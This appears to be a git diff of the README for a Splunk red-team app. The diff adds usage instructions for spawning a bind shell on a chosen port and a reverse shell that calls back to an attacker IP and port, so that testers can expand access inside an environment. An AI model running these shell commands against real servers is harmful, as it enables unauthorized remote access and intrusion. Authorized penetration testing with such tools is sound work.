@@ -9,7 +9,7 @@ This app is to help with penetration testing and Red Teaming within environments
 This app will allow the engineer to spawn a Reverse of Bind Shell from a Splunk server to allow the engineer to
 interact with the server and expand influence within the environment.
 
-= Install =
+# Install
 Download the release from <INSERT RELEASE URL>
 
 Navigate to the "Manage Apps" and click on "Install app from file"
@@ -28,3 +28,10 @@ For Splunk v6.5 ONLY
 Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure the last permission "Sharing for config file-only objects" has "all apps" selected.
 
 ![Alt text](appserver/static/splunk_permissions.png?raw=true "Optional Title")
+
+# Usage
+using each of these shells can be done from the Search and Reporting app. Execute the following searches:
+
+'| bindshell <port number>' The port number can be specified or left off if left off the default is 8888
+
+'| revshell <attack ip> <attack port>' The Attacker IP and Port need to be specified for the shell to call back.
